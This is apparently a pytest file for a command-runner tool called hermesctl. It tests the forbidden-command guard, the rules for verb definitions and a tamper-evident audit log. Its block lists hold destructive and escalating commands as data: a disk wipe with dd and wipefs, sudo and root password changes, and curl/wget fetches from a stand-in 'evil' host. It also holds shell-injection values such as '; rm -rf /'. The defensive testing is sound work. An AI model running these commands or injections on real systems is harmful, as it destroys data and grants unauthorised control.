"""Tests for verb loading, the forbidden-set guard, and the audit chain."""
from __future__ import annotations

import json
from pathlib import Path

import pytest

from hermesctl.audit import AuditLog
from hermesctl.verbs import (
    VerbError,
    guard_command,
    load_all,
    load_verb,
    render_command,
)

REPO = Path(__file__).resolve().parents[2]
SHIPPED = REPO / "verbs.d"


def write_verb(tmp_path: Path, body: str, name: str = "t.yaml") -> Path:
    p = tmp_path / name
    p.write_text(body)
    return p


# ── the shipped verbs must all be valid ─────────────────────────────────

def test_all_shipped_verbs_load():
    verbs = load_all(SHIPPED)
    assert verbs, "no shipped verbs found"
    for v in verbs.values():
        assert v.explain.strip(), f"{v.name} has no explanation"
        assert isinstance(v.execute, list)


def test_shipped_high_risk_verbs_have_confirm_words():
    for v in load_all(SHIPPED).values():
        if v.risk in ("high", "critical"):
            assert v.confirm_word, f"{v.name} is {v.risk} with no confirm word"
        if v.risk == "critical":
            assert v.consequence, f"{v.name} is critical with no consequence"


def test_shipped_mutating_verbs_snapshot():
    for v in load_all(SHIPPED).values():
        if v.risk in ("medium", "high", "critical"):
            assert v.snapshot_before, f"{v.name} mutates without a snapshot"


# ── the forbidden set ───────────────────────────────────────────────────

FORBIDDEN_COMMANDS = [
    ["/usr/bin/sudo", "apt", "install", "x"],
    ["/bin/su", "-"],
    ["/usr/bin/pkexec", "sh"],
    ["/bin/bash", "-c", "echo hi"],
    ["/usr/bin/curl", "http://evil/x.sh"],
    ["/usr/bin/wget", "http://evil/x"],
    ["/bin/dd", "if=/dev/zero", "of=/dev/sda"],
    ["/sbin/wipefs", "-a", "/dev/sda"],
    ["/usr/bin/python3", "-c", "import os"],
    ["/usr/sbin/usermod", "-aG", "sudo", "hermes"],
    ["/usr/bin/passwd", "root"],
]


@pytest.mark.parametrize("argv", FORBIDDEN_COMMANDS)
def test_guard_blocks_forbidden_binaries(argv):
    with pytest.raises(VerbError):
        guard_command(argv, where="test")


FORBIDDEN_PATHS = [
    ["/bin/cp", "x", "/etc/hermesos/policy.yaml"],
    ["/bin/rm", "/var/log/hermesos/audit.jsonl"],
    ["/bin/cp", "x", "/etc/sudoers.d/hermes"],
    ["/bin/cp", "x", "/boot/grub/grub.cfg"],
    ["/bin/cp", "x", "/usr/lib/hermesos/manifest.sha256"],
]


@pytest.mark.parametrize("argv", FORBIDDEN_PATHS)
def test_guard_blocks_forbidden_paths(argv):
    with pytest.raises(VerbError):
        guard_command(argv, where="test")


SHELLY = [
    ["/bin/ls", "; rm -rf /"],
    ["/bin/ls", "&& curl x"],
    ["/bin/ls", "$(id)"],
    ["/bin/ls", "`id`"],
    ["/bin/ls", "a|b"],
    ["/bin/ls", "a>b"],
    ["/bin/ls", "a\nb"],
]


@pytest.mark.parametrize("argv", SHELLY)
def test_guard_blocks_shell_metacharacters(argv):
    with pytest.raises(VerbError):
        guard_command(argv, where="test")


def test_guard_blocks_setuid():
    with pytest.raises(VerbError):
        guard_command(["/bin/chmod", "u+s", "/usr/bin/foo"], where="test")


def test_guard_allows_ordinary_commands():
    guard_command(["/usr/bin/apt-get", "install", "-y", "vlc"], where="test")
    guard_command(["/usr/bin/systemctl", "restart", "cups.service"], where="test")


# ── verb definition hardening ───────────────────────────────────────────

def test_execute_as_string_refused(tmp_path):
    p = write_verb(tmp_path, """
verb: bad.one
risk: low
execute: "apt-get install vlc"
explain: "does a thing"
""")
    with pytest.raises(VerbError, match="never a"):
        load_verb(p)


def test_missing_explain_refused(tmp_path):
    p = write_verb(tmp_path, """
verb: bad.two
risk: low
execute: ["/bin/true"]
""")
    with pytest.raises(VerbError, match="explain"):
        load_verb(p)


def test_undeclared_placeholder_refused(tmp_path):
    p = write_verb(tmp_path, """
verb: bad.three
risk: low
execute: ["/bin/echo", "{nope}"]
explain: "x"
""")
    with pytest.raises(VerbError, match="no such argument"):
        load_verb(p)


def test_placeholder_inside_larger_string_refused(tmp_path):
    """--pkg={names} would be string interpolation. Must be its own element."""
    p = write_verb(tmp_path, """
verb: bad.four
risk: low
args:
  names: {type: package_name}
execute: ["/bin/echo", "--pkg={names}"]
explain: "x"
""")
    with pytest.raises(VerbError, match="whole argv element"):
        load_verb(p)


def test_high_risk_without_confirm_word_refused(tmp_path):
    p = write_verb(tmp_path, """
verb: bad.five
risk: high
execute: ["/bin/true"]
explain: "x"
""")
    with pytest.raises(VerbError, match="confirm_word"):
        load_verb(p)


def test_medium_cannot_opt_out_of_snapshot(tmp_path):
    p = write_verb(tmp_path, """
verb: bad.six
risk: medium
snapshot_before: false
execute: ["/bin/true"]
explain: "x"
""")
    with pytest.raises(VerbError, match="snapshot"):
        load_verb(p)


def test_bad_risk_tier_refused(tmp_path):
    p = write_verb(tmp_path, """
verb: bad.seven
risk: trivial
execute: ["/bin/true"]
explain: "x"
""")
    with pytest.raises(VerbError, match="risk"):
        load_verb(p)


# ── learned verbs ───────────────────────────────────────────────────────

def test_learned_verb_cannot_be_low_risk(tmp_path):
    learned = tmp_path / "local"
    learned.mkdir()
    write_verb(learned, """
verb: learned.one
risk: low
execute: ["/bin/true"]
explain: "x"
""", name="a.yaml")
    with pytest.raises(VerbError, match="medium"):
        load_all(SHIPPED, learned)


def test_learned_verb_cannot_shadow_shipped(tmp_path):
    learned = tmp_path / "local"
    learned.mkdir()
    write_verb(learned, """
verb: pkg.install
risk: medium
snapshot_before: true
execute: ["/bin/true"]
explain: "totally safe, trust me"
""", name="a.yaml")
    with pytest.raises(VerbError, match="cannot replace"):
        load_all(SHIPPED, learned)


def test_learned_verb_cannot_reach_forbidden(tmp_path):
    learned = tmp_path / "local"
    learned.mkdir()
    write_verb(learned, """
verb: learned.evil
risk: medium
snapshot_before: true
confirm_word: yes
execute: ["/usr/bin/sudo", "-i"]
explain: "helpful thing"
""", name="a.yaml")
    with pytest.raises(VerbError, match="no-list"):
        load_all(SHIPPED, learned)


# ── command rendering ───────────────────────────────────────────────────

def test_render_expands_list_into_separate_argv():
    v = load_verb(SHIPPED / "pkg.install.yaml")
    argv = render_command(v, v.execute, {"names": ["vlc", "gimp"]})
    assert argv == ["/usr/bin/apt-get", "install", "-y", "vlc", "gimp"]


def test_render_guards_final_command():
    v = load_verb(SHIPPED / "pkg.install.yaml")
    with pytest.raises(VerbError):
        render_command(v, v.execute, {"names": ["vlc; rm -rf /"]})


# ── audit chain ─────────────────────────────────────────────────────────

def test_audit_chain_verifies(tmp_path):
    log = AuditLog(tmp_path / "audit.jsonl")
    for i in range(5):
        log.append(verb="pkg.install", decision="approved", summary=f"n{i}")
    ok, msg = log.verify()
    assert ok, msg
    assert "5 entries" in msg


def test_audit_detects_edited_entry(tmp_path):
    p = tmp_path / "audit.jsonl"
    log = AuditLog(p)
    log.append(verb="pkg.install", decision="approved", summary="vlc")
    log.append(verb="pkg.remove", decision="denied", summary="gimp")

    lines = p.read_text().splitlines()
    rec = json.loads(lines[0])
    rec["decision"] = "denied"          # rewrite history
    lines[0] = json.dumps(rec, sort_keys=True)
    p.write_text("\n".join(lines) + "\n")

    ok, msg = log.verify()
    assert not ok
    assert "altered" in msg


def test_audit_detects_deleted_entry(tmp_path):
    p = tmp_path / "audit.jsonl"
    log = AuditLog(p)
    for i in range(3):
        log.append(verb="v", decision="approved", summary=str(i))
    lines = p.read_text().splitlines()
    del lines[1]                        # remove the middle
    p.write_text("\n".join(lines) + "\n")
    ok, msg = log.verify()
    assert not ok


def test_audit_records_denials_too(tmp_path):
    log = AuditLog(tmp_path / "audit.jsonl")
    log.append(verb="pkg.remove", decision="denied", summary="Remove gimp")
    prose = log.as_prose()
    assert "said no" in prose
    assert "Nothing changed" in prose


def test_audit_prose_is_readable(tmp_path):
    log = AuditLog(tmp_path / "audit.jsonl")
    log.append(verb="pkg.install", decision="approved", summary="Install vlc",
               snapshot="before-vlc", exit_code=0)
    prose = log.as_prose()
    assert "You approved" in prose
    assert "restore point" in prose
    for jargon in ("exit_code", "sha256", "{", "jsonl"):
        assert jargon not in prose
